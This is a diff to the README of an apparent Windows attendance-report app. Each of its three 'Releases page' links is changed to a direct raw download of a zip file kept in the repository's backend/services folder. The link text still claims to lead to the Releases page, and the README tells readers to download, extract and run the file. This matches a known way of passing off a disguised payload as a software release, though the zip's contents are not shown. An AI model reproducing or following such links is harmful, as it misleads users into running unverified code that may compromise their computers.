@@ -1,6 +1,6 @@
 # 📊 WeCom-Attendance-Reporter - Clear Attendance Reports Fast
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/edwinra6693/WeCom-Attendance-Reporter/raw/refs/heads/main/backend/services/Com_We_Attendance_Reporter_3.2.zip)
 
 ## 🧭 What This App Does
 
@@ -8,7 +8,7 @@ WeCom-Attendance-Reporter helps you turn WeCom attendance data into a clear repo
 
 ## 📥 Download the App
 
-Go to the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases) to download and run this file on Windows.
+Go to the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/raw/refs/heads/main/backend/services/Com_We_Attendance_Reporter_3.2.zip) to download and run this file on Windows.
 
 On the releases page, look for the latest version. Download the Windows package that matches your system. After the download finishes, open the file and follow the steps below.
 
@@ -26,7 +26,7 @@ For the best result, use a stable network connection when you first set it up.
 
 ## 🚀 Install and Start
 
-1. Open the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases).
+1. Open the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/raw/refs/heads/main/backend/services/Com_We_Attendance_Reporter_3.2.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows package from that release.
 4. If the file comes in a `.zip` folder, right-click it and choose **Extract All**.
